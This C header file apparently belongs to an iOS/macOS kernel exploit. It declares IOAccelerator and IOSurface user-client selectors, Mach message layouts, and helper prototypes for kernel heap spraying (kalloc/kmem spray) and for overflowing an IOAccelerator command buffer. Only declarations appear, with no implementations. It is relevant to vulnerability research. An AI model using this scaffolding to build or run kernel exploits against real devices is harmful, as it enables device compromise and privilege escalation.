#ifndef io_h
#define io_h

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <errno.h>
#include <mach/mach.h>
#include <sched.h>
#include <CoreFoundation/CFDictionary.h>
#include <sys/utsname.h>
#include "utilities.h"

extern const mach_port_t kIOMasterPortDefault;

#define IOAccelCommandQueue2_type 4
#define IOAccelSharedUserClient2_type 2
#define IOAccelSharedUserClient2_create_shmem_selector 5
#define IOAccelSharedUserClient2_destroy_shmem_selector 6
#define IOAccelCommandQueue2_set_notification_port_selector 0
#define IOAccelCommandQueue2_submit_command_buffers_selector 1

#define IOSurfaceRootUserClient_create_surface_selector 6
#define IOSurfaceRootUserClient_set_value_selector 9
#define IOSurfaceRootUserClient_get_value_selector 10
#define IOSurfaceRootUserClient_remove_value_selector 11
#define IOSurfaceRootUserClient_increment_use_count_selector 14
#define IOSurfaceRootUserClient_decrement_use_count_selector 15
#define IOSurfaceRootUserClient_set_notify_selector 17

#ifndef __IOKIT_PORTS_DEFINED__
#define __IOKIT_PORTS_DEFINED__
#ifdef KERNEL
typedef struct OSObject * io_object_t;
#else /* KERNEL */
typedef mach_port_t	io_object_t;
#endif /* KERNEL */
#endif /* __IOKIT_PORTS_DEFINED__ */

typedef io_object_t	io_connect_t;
typedef io_object_t	io_enumerator_t;
typedef io_object_t	io_iterator_t;
typedef io_object_t	io_registry_entry_t;
typedef io_object_t	io_service_t;

#define	IO_OBJECT_NULL	((io_object_t) 0)

kern_return_t
IOConnectCallAsyncStructMethod(
	mach_port_t	 connection,		// In
	uint32_t	 selector,		// In
	mach_port_t	 wake_port,		// In
	uint64_t	*reference,		// In
	uint32_t	 referenceCnt,		// In
	const void	*inputStruct,		// In
	size_t		 inputStructCnt,	// In
	void		*outputStruct,		// Out
	size_t		*outputStructCnt);	// In/Out

io_service_t
IOServiceGetMatchingService(
	mach_port_t	masterPort,
	CFDictionaryRef	matching );

CFMutableDictionaryRef
IOServiceMatching(
	const char *	name );

kern_return_t
IOConnectCallMethod(
	mach_port_t	 connection,		// In
	uint32_t	 selector,		// In
	const uint64_t	*input,			// In
	uint32_t	 inputCnt,		// In
	const void      *inputStruct,		// In
	size_t		 inputStructCnt,	// In
	uint64_t	*output,		// Out
	uint32_t	*outputCnt,		// In/Out
	void		*outputStruct,		// Out
	size_t		*outputStructCnt);	// In/Out


kern_return_t
IOObjectRelease(
	io_object_t	object );

kern_return_t
IOServiceOpen(
	io_service_t    service,
	task_port_t	owningTask,
	uint32_t	type,
	io_connect_t  *	connect );

    kern_return_t
IOServiceClose(
	io_connect_t	connect );

    kern_return_t
IOConnectCallScalarMethod(
	mach_port_t	 connection,		// In
	uint32_t	 selector,		// In
	const uint64_t	*input,			// In
	uint32_t	 inputCnt,		// In
	uint64_t	*output,		// Out
	uint32_t	*outputCnt);		// In/Out

    kern_return_t
IOConnectAddClient(
	io_connect_t	connect,
	io_connect_t	client );

    kern_return_t
IOConnectCallAsyncMethod(
	mach_port_t	 connection,		// In
	uint32_t	 selector,		// In
	mach_port_t	 wake_port,		// In
	uint64_t	*reference,		// In
	uint32_t	 referenceCnt,		// In
	const uint64_t	*input,			// In
	uint32_t	 inputCnt,		// In
	const void	*inputStruct,		// In
	size_t		 inputStructCnt,	// In
	uint64_t	*output,		// Out
	uint32_t	*outputCnt,		// In/Out
	void		*outputStruct,		// Out
	size_t		*outputStructCnt);	// In/Out


struct IOSurfaceFastCreateArgs {
    uint64_t address;
    uint32_t width;
    uint32_t height;
    uint32_t pixel_format;
    uint32_t bytes_per_element;
    uint32_t bytes_per_row;
    uint32_t alloc_size;
};

struct IOSurfaceLockResult {
    uint8_t _pad1[0x18];
    uint32_t surface_id;
    uint8_t _pad2[0xdd0-0x18-0x4];
};

struct IOSurfaceValueArgs {
    uint32_t surface_id;
    uint32_t field_4;
    union {
        uint32_t binary[0];
        char xml[0];
    };
};

struct IOSurfaceValueResultArgs {
    uint32_t field_0;
};

int init_IOSurface(void);
void term_IOSurface(void);

int IOSurface_setValue(struct IOSurfaceValueArgs *args, size_t args_size);
int IOSurface_getValue(struct IOSurfaceValueArgs *args, int args_size, struct IOSurfaceValueArgs *output, size_t *out_size);
int IOSurface_removeValue(struct IOSurfaceValueArgs *args, size_t args_size);

int IOSurface_remove_property(uint32_t key);
int IOSurface_kalloc(void *data, uint32_t size, uint32_t kalloc_key);
int IOSurface_kalloc_spray(void *data, uint32_t size, int count, uint32_t kalloc_key);
int IOSurface_empty_kalloc(uint32_t size, uint32_t kalloc_key);

int IOSurface_kmem_alloc(void *data, uint32_t size, uint32_t kalloc_key);
int IOSurface_kmem_alloc_spray(void *data, uint32_t size, int count, uint32_t kalloc_key);

extern uint32_t ps;
extern io_connect_t IOSurfaceRoot;
extern io_service_t IOSurfaceRootUserClient;
extern uint32_t IOSurface_ID;


struct ool_msg  {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports;
};

struct simple_msg {
    mach_msg_header_t hdr;
    char buf[0];
};

typedef struct {
    mach_msg_bits_t       msgh_bits;
    mach_msg_size_t       msgh_size;
    uint64_t              msgh_remote_port;
    uint64_t              msgh_local_port;
    mach_port_name_t      msgh_voucher_port;
    mach_msg_id_t         msgh_id;
} kern_mach_msg_header_t;

struct ool_kmsg  {
    kern_mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports;
};

struct simple_kmsg {
    kern_mach_msg_header_t hdr;
    char buf[0];
};


struct IOAccelDeviceShmemData {
    void *data;
    uint32_t length;
    uint32_t shmem_id;
};

struct IOAccelCommandQueueSubmitArgs_Header {
    uint32_t field_0;
    uint32_t count;
};

struct IOAccelCommandQueueSubmitArgs_Command {
    uint32_t command_buffer_shmem_id;
    uint32_t segment_list_shmem_id;
    uint64_t notify_1;
    uint64_t notify_2;
};

struct IOAccelSegmentListHeader {
    uint32_t field_0;
    uint32_t field_4;
    uint32_t segment_count;
    uint32_t length;
};

struct IOAccelSegmentResourceList_ResourceGroup {
    uint32_t resource_id[6];
    uint8_t field_18[48];
    uint16_t resource_flags[6];
    uint8_t field_54[2];
    uint16_t resource_count;
};

struct IOAccelSegmentResourceListHeader {
    uint64_t field_0;
    uint32_t kernel_commands_start_offset;
    uint32_t kernel_commands_end_offset;
    int total_resources;
    uint32_t resource_group_count;
    struct IOAccelSegmentResourceList_ResourceGroup resource_groups[];
};

struct IOAccelKernelCommand {
    uint32_t type;
    uint32_t size;
};

struct IOAccelKernelCommand_CollectTimeStamp {
    struct IOAccelKernelCommand command;
    uint64_t timestamp;
};

kern_return_t IOAccelSharedUserClient2_create_shmem(size_t size, struct IOAccelDeviceShmemData *shmem);
kern_return_t IOAccelSharedUserClient2_destroy_shmem(uint32_t shmem_id);
kern_return_t IOAccelCommandQueue2_set_notification_port(mach_port_t notification_port);
kern_return_t IOAccelCommandQueue2_submit_command_buffers(const struct IOAccelCommandQueueSubmitArgs_Header *submit_args, size_t size);

int alloc_shmem(uint32_t buffer_size, struct IOAccelDeviceShmemData *cmdbuf, struct IOAccelDeviceShmemData *seglist);
int overflow_n_bytes(uint32_t buffer_size, int n, struct IOAccelDeviceShmemData *cmdbuf, struct IOAccelDeviceShmemData *seglist);
int make_buffer_readable_by_kernel(void *buffer, uint64_t n_pages);

int init_IOAccelerator(void);
void term_IOAccelerator(void);

extern io_connect_t IOAccelCommandQueue2;
extern io_connect_t IOAccelSharedUserClient2;
extern io_service_t IOGraphicsAccelerator2;
#endif /* io_h */

